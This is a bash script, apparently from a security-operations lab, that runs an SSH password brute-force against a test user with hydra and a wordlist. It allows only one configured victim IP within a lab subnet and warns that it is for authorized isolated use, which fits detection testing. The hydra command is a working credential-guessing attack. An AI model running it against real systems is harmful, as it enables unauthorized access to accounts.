#!/usr/bin/env bash

# chmod +x scripts/attack_simulation.sh

# export UBUNTU_AGENT_IP=192.168.122.149
# export SSH_TEST_USER=soc-lab
# ./scripts/attack_simulation.sh tests/wordlists/invalid-3.txt

set -Eeuo pipefail

TARGET="${UBUNTU_AGENT_IP:?Set UBUNTU_AGENT_IP first}"

TEST_USER="${SSH_TEST_USER:-soc-lab}"

WORDLIST="${1:?Usage: ./attack_simulation.sh WORDLIST}"

EXPECTED_VICTIM_IP="${EXPECTED_VICTIM_IP:-192.168.122.149}"

LAB_CIDR="${LAB_CIDR:-192.168.122.0/24}"


# Check required tools.

for tool in hydra python3; do

    if ! command -v "$tool" >/dev/null 2>&1; then

        echo "[ERROR] Missing dependency: $tool"
        exit 1

    fi

done


# Validate wordlist.

if [[ ! -f "$WORDLIST" || ! -r "$WORDLIST" ]]; then

    echo "[ERROR] Wordlist does not exist or is not readable."
    exit 1

fi


# Validate target IPv4 and restrict it to this lab.

python3 - "$TARGET" "$EXPECTED_VICTIM_IP" "$LAB_CIDR" <<'PY'

import ipaddress
import sys

target = ipaddress.ip_address(sys.argv[1])
expected = ipaddress.ip_address(sys.argv[2])
network = ipaddress.ip_network(sys.argv[3])

if target.version != 4:
    raise SystemExit("[ERROR] IPv4 only.")

if target != expected:
    raise SystemExit(
        f"[ERROR] Target must be the configured victim: {expected}"
    )

if target not in network:
    raise SystemExit(
        f"[ERROR] Target is outside lab network {network}"
    )

print(f"[PASS] Valid lab target: {target}")

PY


echo "[INFO] SSH brute-force simulation"
echo "[INFO] Target: $TARGET"
echo "[INFO] User: $TEST_USER"
echo "[INFO] Wordlist: $WORDLIST"

echo "[WARNING] Authorized isolated laboratory only."


hydra \
    -l "$TEST_USER" \
    -P "$WORDLIST" \
    -t 1 \
    -w 3 \
    "ssh://$TARGET"


echo "[INFO] Simulation finished."
